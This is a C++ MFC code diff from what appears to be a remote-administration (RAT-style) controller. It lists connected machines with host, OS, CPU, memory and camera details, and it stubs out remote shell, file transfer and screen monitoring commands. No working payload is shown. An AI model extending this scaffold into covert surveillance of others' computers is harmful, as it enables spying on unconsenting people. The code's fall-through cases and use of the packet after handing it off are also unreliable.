@@ -90,6 +90,7 @@ BEGIN_MESSAGE_MAP(CMFCApplication4Dlg, CDialogEx)
 	ON_BN_CLICKED(IDC_BUTTON2, &CMFCApplication4Dlg::OnBnClickedButton2)
 
 	ON_MESSAGE(WM_RECV_LOGIN_PACKET, OnRecvLoginPacket)
+	ON_MESSAGE(WM_CLIENT_DISCONNECT, OnClientDisconnect)
 END_MESSAGE_MAP()
 
 
@@ -128,31 +129,17 @@ BOOL CMFCApplication4Dlg::OnInitDialog()
 
 	// 以下是List Control
 	//标题所需字段
-	CString head[] = { TEXT("ID"),TEXT("IP"),TEXT("计算机名") };
-
-	CString name[] = { TEXT("李白"),TEXT("鲁班"),TEXT("韩信"),
-					TEXT("亚索"),TEXT("达摩"),TEXT("小明") };
+	CString head[] = { TEXT("ConnectId"),TEXT("IP"), TEXT("端口"), TEXT("计算机名"), TEXT("操作系统"), TEXT("CPU"), TEXT("内存"), TEXT("摄像头")};
 
 	//插入列标题
-	m_ListCtrl.InsertColumn(0, head[0], LVCFMT_LEFT, 100);
-	m_ListCtrl.InsertColumn(1, head[1], LVCFMT_LEFT, 100);
-	m_ListCtrl.InsertColumn(2, head[2], LVCFMT_LEFT, 100);
-
-	////插入正文内容
-	//for (int i = 0; i < 6; i++) {
-	//	//	CString str;
-	//	//  str.Format(TEXT("张三_%d"),i);
-	//	//	str.Format(TEXT("name[i]_%d"),i);
-
-	//		//确定行数
-	//	m_ListCtrl.InsertItem(i, name[i]);
-
-	//	//设置列内容
-	//	int j = 0;
-	//	int age = 23;
-	//	m_ListCtrl.SetItemText(i, ++j, TEXT("23"));//怎么设置int
-	//	m_ListCtrl.SetItemText(i, ++j, TEXT("男"));
-	//}
+	m_ListCtrl.InsertColumn(0, head[0], LVCFMT_LEFT, 10);			// ConnectId仅用于标识，长度设为0，不在图像界面的列表中显示
+	m_ListCtrl.InsertColumn(1, head[1], LVCFMT_LEFT, 110);
+	m_ListCtrl.InsertColumn(2, head[2], LVCFMT_LEFT, 50);
+	m_ListCtrl.InsertColumn(3, head[3], LVCFMT_LEFT, 150);
+	m_ListCtrl.InsertColumn(4, head[4], LVCFMT_LEFT, 150);
+	m_ListCtrl.InsertColumn(5, head[5], LVCFMT_LEFT, 350);
+	m_ListCtrl.InsertColumn(6, head[6], LVCFMT_LEFT, 150);
+	m_ListCtrl.InsertColumn(7, head[7], LVCFMT_LEFT, 60);
 
 	//设置风格样式
 	//LVS_EX_GRIDLINES 网格
@@ -305,10 +292,81 @@ afx_msg LRESULT CMFCApplication4Dlg::OnRecvLoginPacket(WPARAM wParam, LPARAM lPa
 
 	CPacket* pPacket = (CPacket*)lParam;
 	LOGIN_INFO LoginInfo(pPacket->m_pbPacketBody);
-	
 
+	CHAR szConnectId[15];
+	_itoa_s(pPacket->m_pClient->m_dwConnectId, szConnectId, 15);	// 从数字转成CHAR字符串
+
+	CHAR szPort[10];
+	_itoa_s(pPacket->m_pClient->m_wPort, szPort, 10);
+
+	USES_CONVERSION;				// 使用A2W之前先声明这个
+
+
+	DWORD dwInsertIndex = m_ListCtrl.GetItemCount();	// 插入到列表尾部
+
+	LV_ITEM   lvitemData = {0};
+	lvitemData.mask = LVIF_PARAM;
+	lvitemData.iItem = dwInsertIndex;
+	lvitemData.lParam = (LPARAM)(pPacket->m_pClient);	// 额外的信息，这里用于保存本行对应的pClient
+
+	m_ListCtrl.InsertItem(&lvitemData);
+	//m_ListCtrl.InsertItem(0, A2W(szConnectId));								// 第一列，ID。第一个参数0是指在第0行处插入这一行
+	m_ListCtrl.SetItemText(dwInsertIndex, 1, pPacket->m_pClient->m_lpszIpAddress);		// IP
+	m_ListCtrl.SetItemText(dwInsertIndex, 2, A2W(szPort));								// 端口
+	m_ListCtrl.SetItemText(dwInsertIndex, 3, A2W(LoginInfo.szHostName));				// 计算机名
+	m_ListCtrl.SetItemText(dwInsertIndex, 4, A2W(LoginInfo.szOsVersion));				// 操作系统
+	m_ListCtrl.SetItemText(dwInsertIndex, 5, A2W(LoginInfo.szCpuType));					// CPU
+	m_ListCtrl.SetItemText(dwInsertIndex, 6, A2W(LoginInfo.szMemoryInfo));				// 内存
+	m_ListCtrl.SetItemText(dwInsertIndex, 7, A2W(LoginInfo.bHaveCamera ? "有" : "无"));	// 摄像头
+
+	delete pPacket;			// 用完了一定要释放啊
 	return 0;
 }
+
+
+// 与客户端的连接中断
+afx_msg LRESULT CMFCApplication4Dlg::OnClientDisconnect(WPARAM wParam, LPARAM lParam) {
+
+	CONNID dwConnectId = (CONNID)wParam;
+
+	
+
+	CHAR szConnectId[15];
+	//USES_CONVERSION;
+	//_itoa_s(wConnectId, szConnectId, 15);	// 从数字转成CHAR字符串
+	//m_ListCtrl.DeleteItem(A2W(szConnectId));
+	//for (int i = 0; i < nCol; i++)
+	//{
+	//	m_ListCtrl.DeleteColumn(0);
+	//}
+
+
+	CClient* pClient = NULL;
+	DWORD dwIndex;
+
+	for (dwIndex = 0; dwIndex < m_ListCtrl.GetItemCount(); dwIndex++) {
+		// 获取所枚举的这一行的额外信息，pClient
+		LV_ITEM  lvitemData = { 0 };
+		lvitemData.mask = LVIF_PARAM;
+		lvitemData.iItem = dwIndex;
+		m_ListCtrl.GetItem(&lvitemData);
+		pClient = (CClient*)lvitemData.lParam;
+
+		// 确定要删除的那行的索引，并删除这一行
+		if (dwConnectId == pClient->m_dwConnectId) {
+			m_ListCtrl.DeleteItem(dwIndex);
+			MessageBox(L"下线！");
+			break;
+		}
+	}
+
+	if (pClient != NULL) {		// 这里必须不为NULL，如果这里为NULL，说明我程序一定有逻辑问题。
+		theApp.m_Server.m_ClientManage.DeleteClientFromList(pClient);		// 在这个函数里delete pClient
+	}
+	
+	return 0;
+}
+
 
 
 
@@ -323,31 +381,25 @@ void CALLBACK CMFCApplication4Dlg::ManageRecvPacket(CPacket *pPacket) {
 		// 这个阶段，只要不是上线包，通通丢弃。
 		if (pPacket->m_PacketHead.wCommandId == LOGIN && pPacket->m_dwPacketBodyLength == LOGIN_PACKET_BODY_LENGTH) {
 			theApp.m_pMainWnd->PostMessage(WM_RECV_LOGIN_PACKET, 0, (LPARAM)pPacket);
+			pPacket->m_pClient->m_dwClientStatus = LOGINED;
 		}
 
+	case LOGINED:											// 接收上线包后，状态变为已登录。开始正常通信。
+		
+		switch (pPacket->m_PacketHead.wCommandId) {
 
+		// 远程SHELL
+		case SHELL_REMOTE:
+			;
 
-	case LOGINED:									// 接收上线包后，状态变为已登录。开始正常通信。
-		;
+		// 文件管理
+		case FILE_TRANSFOR:
+			;
+
+		// 屏幕监控
+		case SCREEN_MONITOR:
+			;
+		}
 	}
 
-
-
-
-
-
-	//switch (pPacket.m_PacketHead.wCommandId) {
-
-	//	// 远程SHELL
-	//case SHELL_REMOTE:
-	//	;
-
-	//	// 文件管理
-	//case FILE_TRANSFOR:
-	//	;
-
-	//	// 屏幕监控
-	//case SCREEN_MONITOR:
-	//	;
-	//}
 }
